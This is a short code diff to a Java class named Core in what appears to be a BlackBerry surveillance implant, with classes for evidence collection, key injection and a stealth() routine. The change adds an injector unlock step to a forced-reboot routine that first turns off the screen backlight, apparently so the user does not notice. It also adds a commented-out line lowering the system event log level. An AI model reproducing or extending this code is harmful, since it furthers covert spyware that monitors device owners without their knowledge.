@@ -25,6 +25,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.fs.Path;
+import blackberry.injection.InjectorManager;
 import blackberry.injection.KeyInjector;
 import blackberry.utils.Utils;
 
@@ -243,6 +244,7 @@ public final class Core implements Runnable {
         Evidence.info("Start" + demo + ",  build: " + Cfg.BUILD_ID + " " + Cfg.BUILD_TIMESTAMP); //$NON-NLS-1$ //$NON-NLS-2$
         //#else
         Evidence.info(Messages.getString("7.17") + demo); //$NON-NLS-1$
+        //EventLogger.setMinimumLevel(EventLogger.SEVERE_ERROR);
         //#endif
 
         stealth();
@@ -328,9 +330,16 @@ public final class Core implements Runnable {
     public static void forceReboot() {
         //TODO: se il telefono e' occupato, attendere il tempo necessario.
         try {
-            Backlight.enable(false);            
+
+            Backlight.enable(false);
             //Main.getInstance().pushBlack();
             Utils.sleep(8000);
+
+            if(!InjectorManager.unLock()){
+                //#ifdef DEBUG
+                debug.trace("forceReboot: unlock failed");
+                //#endif
+            }
 
             if (Backlight.isEnabled()) {
                 //#ifdef DEBUG
